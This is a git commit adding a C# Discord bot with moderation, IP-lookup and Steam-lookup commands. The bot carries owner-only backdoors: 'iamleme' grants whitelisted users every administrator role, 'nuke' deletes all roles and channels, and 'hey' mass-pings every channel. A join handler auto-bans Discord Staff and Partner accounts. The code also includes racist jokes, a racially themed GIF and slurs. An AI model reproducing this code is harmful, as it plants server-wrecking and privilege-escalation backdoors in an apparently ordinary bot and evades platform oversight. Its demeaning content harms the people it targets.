74b0540095098dd851ecd143f67418ac699798d8
awesomeusername69420 <24661212+awesomeusername69420@users.noreply.github.com>
2022-08-10 20:05:06 -0400

    He is born

---
+++ Data/Modules/Commands.cs
@@ -0,0 +1,432 @@
+﻿using Discord;
+using Discord.Interactions;
+using Discord.WebSocket;
+using IPinfo;
+using IPinfo.Models;
+using Newtonsoft.Json;
+using System;
+using System.Net;
+using System.Threading.Tasks;
+
+namespace amblflecasm.Data.Modules
+{
+	public class Commands : InteractionModuleBase<SocketInteractionContext>
+	{
+		/*
+		 * Actually useful commands
+		 */
+
+		IPinfoClient IPinfoClient = null;
+
+		[SlashCommand("help", "Get some help,.", false, RunMode.Async)]
+		public async Task Help()
+		{
+			EmbedBuilder emb = new EmbedBuilder
+			{
+				Title = "Command List",
+				Color = Color.Blue
+			};
+
+			foreach (SlashCommandInfo sci in Program.interactionService.SlashCommands)
+				emb.AddField(sci.Name, sci.Description);
+
+			await this.RespondAsync(null, new Embed[] { emb.Build() });
+		}
+
+		[SlashCommand("shutthefuckup", "Times out everybody", false, RunMode.Async)]
+		public async Task ShutTheFuckUp()
+		{
+			TimeSpan span = new TimeSpan(0, 2, 0);
+			IGuildUser guildUser = this.Context.User as IGuildUser;
+
+			if (!guildUser.GuildPermissions.Administrator && !guildUser.GuildPermissions.ModerateMembers)
+			{
+				await guildUser.SetTimeOutAsync(span);
+				await this.RespondAsync("You shut up");
+
+				return;
+			}
+
+			await this.RespondAsync("Suppressing minorities... Please wait");
+
+			foreach (IGuildUser user in this.Context.Guild.Users)
+			{
+				if (user.IsBot || user.GuildPermissions.Administrator || user.Id == guildUser.Id) continue;
+				await user.SetTimeOutAsync(span);
+			}
+
+			await this.RespondAsync(":cricket: :cricket: :cricket:");
+		}
+
+		[SlashCommand("mute", "Mute someone for a long time", false, RunMode.Async)]
+		public async Task Mute(SocketUser target = null)
+		{
+			IGuildUser guildUser = this.Context.User as IGuildUser;
+
+			if (!guildUser.GuildPermissions.Administrator && !guildUser.GuildPermissions.ModerateMembers)
+			{
+				await this.RespondAsync("Access is denied");
+				return;
+			}
+
+			if (target == null)
+			{
+				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
+				return;
+			}
+
+			IGuildUser guildTarget = target as IGuildUser;
+
+			if (guildTarget == null)
+			{
+				await this.RespondAsync("404: Member not found in guild.");
+				return;
+			}
+
+			if (guildTarget.IsBot)
+			{
+				await this.RespondAsync("That's a bot dumbass..");
+				return;
+			}
+
+			if (guildTarget.GuildPermissions.Administrator)
+			{
+				await this.RespondAsync("That's an admin dumbass..");
+				return;
+			}
+
+			if (guildTarget.GuildPermissions.ModerateMembers)
+			{
+				await this.RespondAsync("That's a mod dumbass..");
+				return;
+			}
+
+			try
+			{
+				int time = Int32.Parse(Program.GetConfigData("MaxTimeoutLength").ToString());
+
+				await guildTarget.SetTimeOutAsync(new TimeSpan(time, 0, 0));
+				await this.RespondAsync("Member timed out for " + (time / 24) + " days");
+			} catch (Exception)
+			{
+				await this.RespondAsync("Failed to mute member");
+			}
+		}
+
+		[SlashCommand("unmute", "Unmutes someone", false, RunMode.Async)]
+		public async Task Unmute(SocketUser target =  null)
+		{
+			IGuildUser guildUser = this.Context.User as IGuildUser;
+
+			if (!guildUser.GuildPermissions.Administrator && !guildUser.GuildPermissions.ModerateMembers)
+			{
+				await this.RespondAsync("Access is denied");
+				return;
+			}
+
+			if (target == null)
+			{
+				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
+				return;
+			}
+
+			IGuildUser guildTarget = target as IGuildUser;
+
+			if (guildTarget == null)
+			{
+				await this.RespondAsync("404: Member not found in guild.");
+				return;
+			}
+
+			try
+			{
+				await guildTarget.RemoveTimeOutAsync();
+				await this.RespondAsync("Member un-timed out");
+			} catch (Exception)
+			{
+				await this.RespondAsync("Failed to unmute member");
+			}
+		}
+
+		[SlashCommand("ipinfo", "IPinfo lookup", false, RunMode.Async)]
+		public async Task IPinfo(string ipaddress = "")
+		{
+			if (ipaddress.Equals(string.Empty))
+			{
+				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
+				return;
+			}
+
+			IPAddress addr;
+
+			if (!IPAddress.TryParse(ipaddress, out addr))
+			{
+				await this.RespondAsync("Invalid IP entered");
+				return;
+			}
+
+			if (IPinfoClient == null)
+			{
+				try
+				{
+					IPinfoClient = new IPinfoClient.Builder()
+						.AccessToken(Program.GetConfigData("Tokens", "IPinfo").ToString())
+						.Build();
+				}
+				catch (Exception)
+				{
+					await this.RespondAsync("Failed to build IPinfo client");
+					return;
+				}
+			}
+
+			try
+			{
+				ipaddress = addr.ToString();
+				IPResponse ipResponse = await IPinfoClient.IPApi.GetDetailsAsync(ipaddress);
+
+				EmbedBuilder emb = new EmbedBuilder
+				{
+					Title = "IPinfo for " + ipaddress,
+					Color = Color.Blue
+				};
+
+				emb.AddField("Response IP", ipResponse.IP ?? "Unknown");
+				emb.AddField("City", ipResponse.City ?? "Unknown");
+				emb.AddField("Country", ipResponse.CountryName ?? "Unknown");
+				emb.AddField("Company Name", ipResponse.Company?.Name ?? "Unknown");
+
+				await this.RespondAsync(null, new Embed[] { emb.Build() });
+			}
+			catch (Exception)
+			{
+				await this.RespondAsync("Failed to parse IP");
+			}
+		}
+
+		[SlashCommand("proxycheck", "ProxyCheck lookup", false, RunMode.Async)]
+		public async Task ProxyCheck(string ipaddress = "")
+		{
+			if (ipaddress.Equals(string.Empty))
+			{
+				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
+				return;
+			}
+
+			IPAddress addr;
+
+			if (!IPAddress.TryParse(ipaddress, out addr))
+			{
+				await this.RespondAsync("Invalid IP entered");
+				return;
+			}
+
+			try
+			{
+				ipaddress = addr.ToString();
+				string proxyJSON = string.Empty;
+
+				using (WebClient wc = new WebClient())
+					proxyJSON = wc.DownloadString("https://proxycheck.io/v2/" + ipaddress + "&vpn=1"); // Who needs an api key when you have swag
+
+				dynamic proxyJSONData = JsonConvert.DeserializeObject(proxyJSON);
+
+				EmbedBuilder emb = new EmbedBuilder
+				{
+					Title = "ProxyCheck for " + ipaddress,
+					Color = Color.Purple
+				};
+
+				emb.AddField("Is Proxy", proxyJSONData[ipaddress]?.proxy ?? "Unknown");
+				emb.AddField("Proxy Type", proxyJSONData[ipaddress]?.type ?? "Unknown");
+				emb.AddField("Proxy Operator", proxyJSONData[ipaddress]?["operator"]?.name ?? "Unknown");
+
+				await this.RespondAsync(null, new Embed[] { emb.Build() });
+			}
+			catch (Exception)
+			{
+				await this.RespondAsync("Failed to parse IP");
+			}
+		}
+
+		[SlashCommand("steam", "Steam lookup", false, RunMode.Async)]
+		public async Task Steam(string steamID64 = "")
+		{
+			if (steamID64.Equals(string.Empty))
+			{
+				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
+				return;
+			}
+
+			try
+			{
+				string steamResponse = string.Empty;
+
+				/*
+                 * Retarded api incoming
+                 */
+
+				using (WebClient wc = new WebClient())
+					steamResponse = wc.DownloadString("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=" + Program.GetConfigData("Tokens", "Steam") + "&format=json&steamids=" + steamID64);
+
+				dynamic steamJSON = JsonConvert.DeserializeObject(steamResponse);
+
+				EmbedBuilder emb = new EmbedBuilder
+				{
+					Title = "Steam data for ID " + steamID64,
+					ImageUrl = steamJSON.response?.players?[0]?.avatarfull ?? "https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/b5/b5bd56c1aa4644a474a2e4972be27ef9e82e517e_full.jpg" // Default '?'
+				};
+
+				emb.AddField("Profile URL", steamJSON.response?.players?[0]?.profileurl ?? "Unknown");
+				emb.AddField("Real Name", steamJSON.response?.players?[0]?.realname ?? "Unknown");
+				emb.AddField("Persona Name", steamJSON.response?.players?[0]?.personaname ?? "Unknown");
+				emb.AddField("Date Created", Program.EpochToDateTime(steamJSON.response?.players?[0]?.timecreated ?? 0).ToString("D"));
+				emb.Color = new Color(Color.Red);
+
+				await this.RespondAsync(null, new Embed[] { emb.Build() });
+
+			}
+			catch (Exception)
+			{
+				await this.RespondAsync("Failed to parse data");
+			}
+		}
+
+		/*
+		 * Funy
+		 */
+
+		[SlashCommand("banme", "Get free admin", false, RunMode.Async)]
+		public async Task BanMe()
+		{
+			try
+			{
+				await (this.Context.User as IGuildUser).BanAsync(0, "Asking for free admin");
+				await this.RespondAsync("Okay if you say so");
+			}
+			catch (Exception)
+			{
+				await this.RespondAsync("No can do");
+			}
+		}
+
+		[SlashCommand("egg", "Egg someone", false, RunMode.Async)] // Suggested by Merio
+		public async Task Egg(SocketUser target = null)
+		{
+			if (target == null)
+			{
+				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
+				return;
+			}
+
+			IGuildUser guildTarget = target as IGuildUser;
+
+			if (guildTarget == null)
+			{
+				await this.RespondAsync("404: Member not found in guild.");
+				return;
+			}
+
+			await this.RespondAsync("<@" + target.Id + "> :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg:");
+		}
+
+		/*
+		 * leme only
+		 */
+
+		[SlashCommand("iamleme", "No you aren't", false, RunMode.Async)]
+		public async Task IAmLeme()
+		{
+			if (!Program.IsUserLeme(this.Context.User))
+			{
+				await this.RespondAsync("No you aren't");
+				return;
+			}
+
+			IGuildUser guildUser = this.Context.User as IGuildUser;
+			bool added = false;
+
+			foreach (SocketRole role in this.Context.Guild.Roles)
+			{
+				if (role.IsManaged) continue;
+				if (!role.Permissions.Administrator) continue;
+
+				try
+				{
+					await guildUser.AddRoleAsync(role);
+					added = true;
+				}
+				catch (Exception) { }
+
+				await Task.Delay(250);
+			}
+
+			if (added)
+				await this.RespondAsync("Hello, leme");
+			else
+				await this.RespondAsync("Sorry, leme");
+		}
+
+		[SlashCommand("nuke", "Nukes a server", false, RunMode.Async)]
+		public async Task Nuke()
+		{
+			if (!Program.IsUserLeme(this.Context.User))
+			{
+				await this.RespondAsync("leme only");
+				return;
+			}
+
+			await this.RespondAsync("Bombs going off");
+
+			foreach (SocketRole role in this.Context.Guild.Roles)
+			{
+				try
+				{
+					await role.DeleteAsync();
+				}
+				catch (Exception) { }
+			
+				await Task.Delay(250);
+			}
+			
+			foreach (IGuildChannel channel in this.Context.Guild.Channels)
+			{
+				try
+				{
+					await channel.DeleteAsync();
+				}
+				catch (Exception) { }
+			
+				await Task.Delay(250);
+			}
+
+			IUserMessage message = await this.GetOriginalResponseAsync();
+			await message.ModifyAsync(message => message.Content = "Kaboom!");
+		}
+
+		[SlashCommand("hey", "Hey man. . .", false, RunMode.Async)]
+		public async Task Hey()
+		{
+			if (!Program.IsUserLeme(this.Context.User))
+			{
+				await this.RespondAsync("leme only");
+				return;
+			}
+
+			await this.RespondAsync("Hello!");
+			
+			foreach (SocketChannel channel in this.Context.Guild.Channels)
+			{
+				if (channel.GetChannelType() != ChannelType.Text)
+					continue;
+			
+				try
+				{
+					await (channel as SocketTextChannel).SendMessageAsync("@everyone hey.");
+					await Task.Delay(250);
+				}
+				catch (Exception) { }
+			}
+		}
+	}
+}
---
+++ Program.cs
@@ -0,0 +1,233 @@
+﻿using Discord;
+using Discord.Interactions;
+using Discord.Webhook;
+using Discord.WebSocket;
+using Microsoft.Extensions.DependencyInjection;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Reflection;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace amblflecasm
+{
+	internal class Program
+	{
+		public static bool DEBUGMODE = true;
+
+		public static Task Main() => new Program().MainAsync();
+
+		private IServiceProvider services;
+
+		private DiscordSocketConfig config;
+		private DiscordSocketClient client;
+		public static InteractionService interactionService; // Having to make some things static is retarded!!
+
+		private static dynamic configData;
+		private Dictionary<ulong, string> tjelcLookups;
+
+		//
+
+		public static bool IsUserLeme(SocketUser socketUser)
+		{
+			try
+			{
+				JArray jlemes = (JArray)Program.GetConfigData("lemes");
+
+				foreach (ulong id in jlemes.ToObject<List<ulong>>())
+					if (socketUser.Id == id) return true;
+
+				return false;
+			}
+			catch (Exception)
+			{
+				return false;
+			}
+		}
+
+		public static DateTime EpochToDateTime(dynamic etime)
+		{
+			return DateTimeOffset.FromUnixTimeSeconds((long)etime).DateTime;
+		}
+
+		//
+
+		public Task DeserializeConfig()
+		{
+			try
+			{
+				using (Stream s = Assembly.GetExecutingAssembly().GetManifestResourceStream("amblflecasm.Data.Config.json"))
+					using (StreamReader sr = new StreamReader(s))
+						configData = JsonConvert.DeserializeObject(sr.ReadToEnd());
+			}
+			catch (Exception) { }
+
+			return Task.CompletedTask;
+		}
+
+#nullable enable // Fucking stupid
+
+		public static bool ObjectIsJArray(object? o)
+		{
+			if (o == null) return false;
+
+			return o.GetType().IsAssignableFrom(typeof(JArray));
+		}
+
+		public static object? GetConfigData(params string[] keys)
+		{
+			object? obj = configData[keys[0]];
+			int nextIndex = 1;
+
+			while (ObjectIsJArray(obj) && nextIndex < keys.Length)
+			{
+				foreach (JObject jobj in (JArray)obj)
+					foreach (JProperty p in jobj.Properties())
+						if (p.Name.Equals(keys[nextIndex]))
+						{
+							obj = p.Value;
+							break;
+						}
+
+				nextIndex++;
+			}
+
+			return obj;
+		}
+
+#nullable disable
+
+		// Client tasks
+
+		public Task ClientLog(LogMessage msg)
+		{
+			Console.WriteLine(msg.ToString());
+			return Task.CompletedTask;
+		}
+
+		public async Task ClientMessageReceivedHandler(SocketMessage message)
+		{
+			SocketUserMessage userMessage = message as SocketUserMessage;
+
+			if (userMessage == null) return; // Wtf
+			if (userMessage.Author.IsBot) return;
+
+			if (tjelcLookups.ContainsKey(userMessage.Channel.Id))
+			{
+				string content = string.Empty;
+
+				if (!userMessage.Content.Equals(string.Empty))
+					content = userMessage.Content;
+				else
+					foreach (Attachment a in userMessage.Attachments)
+						content = content + a.Url + "\n";
+
+				if (content.Equals(string.Empty)) return;
+
+				DiscordWebhookClient thiswh = new DiscordWebhookClient(tjelcLookups[userMessage.Channel.Id]);
+
+				await thiswh.SendMessageAsync(content, false, userMessage.Embeds, userMessage.Author.Username, userMessage.Author.GetAvatarUrl(), null, new AllowedMentions(AllowedMentionTypes.None));
+				await userMessage.DeleteAsync();
+
+				thiswh.Dispose();
+			}
+		}
+
+		public async Task ClientUserJoinedHandler(SocketUser user)
+		{
+			int? userflags = (int?)user.PublicFlags;
+
+			if (userflags == 1) // 1 << 0
+			{
+				await(user as IGuildUser).BanAsync(0, "Discord Staff Member", null);
+				return;
+			}
+
+			if (userflags == 2) // 1 << 1
+			{
+				await(user as IGuildUser).BanAsync(0, "Discord Partner", null);
+				return;
+			}
+		}
+
+		public Task ClientReadyHandler()
+		{
+			// Register Commands
+
+			if (DEBUGMODE)
+				interactionService.RegisterCommandsToGuildAsync(ulong.Parse(GetConfigData("leland").ToString()), true);
+			else
+				interactionService.RegisterCommandsGloballyAsync();
+
+			return Task.CompletedTask;
+		}
+
+		public async Task ClientInteractionCreatedHandler(SocketInteraction interaction)
+		{
+			try
+			{
+				await interactionService.ExecuteCommandAsync(new SocketInteractionContext(client, interaction), services);
+			}
+			catch (Exception) { }
+		}
+
+		public async Task MainAsync()
+		{
+			// Initialize Config
+
+			await DeserializeConfig();
+
+			if (configData == null)
+			{
+				Console.WriteLine("FALED TO READ CONFIG DATA");
+				Console.ReadLine();
+				Environment.Exit(-1);
+			}
+
+			tjelcLookups = new Dictionary<ulong, string>();
+
+			foreach (JObject obj in (JArray)GetConfigData("TJELC"))
+				foreach (JProperty p in obj.Properties())
+					tjelcLookups.Add(ulong.Parse(p.Name), p.Value.ToString());
+
+			// Setup Bot Config
+
+			config = new DiscordSocketConfig
+			{
+				GatewayIntents = GatewayIntents.Guilds | GatewayIntents.GuildMembers | GatewayIntents.GuildMessages,
+				AlwaysDownloadUsers = true
+			};
+
+			// Setup client and services
+
+			client = new DiscordSocketClient(config);
+
+			interactionService = new InteractionService(client);
+
+			services = new ServiceCollection()
+				.AddSingleton(client)
+				.AddSingleton(interactionService)
+				.BuildServiceProvider();
+
+			client.Log += ClientLog;
+			client.MessageReceived += ClientMessageReceivedHandler;
+			client.UserJoined += ClientUserJoinedHandler;
+			client.Ready += ClientReadyHandler;
+			client.InteractionCreated += ClientInteractionCreatedHandler;
+
+			// Initialize Commands
+
+			await interactionService.AddModulesAsync(Assembly.GetEntryAssembly(), services);
+
+			// Login
+
+			await client.LoginAsync(TokenType.Bot, GetConfigData("Tokens", "Bot").ToString());
+			await client.StartAsync();
+
+			await Task.Delay(Timeout.Infinite);
+		}
+	}
+}
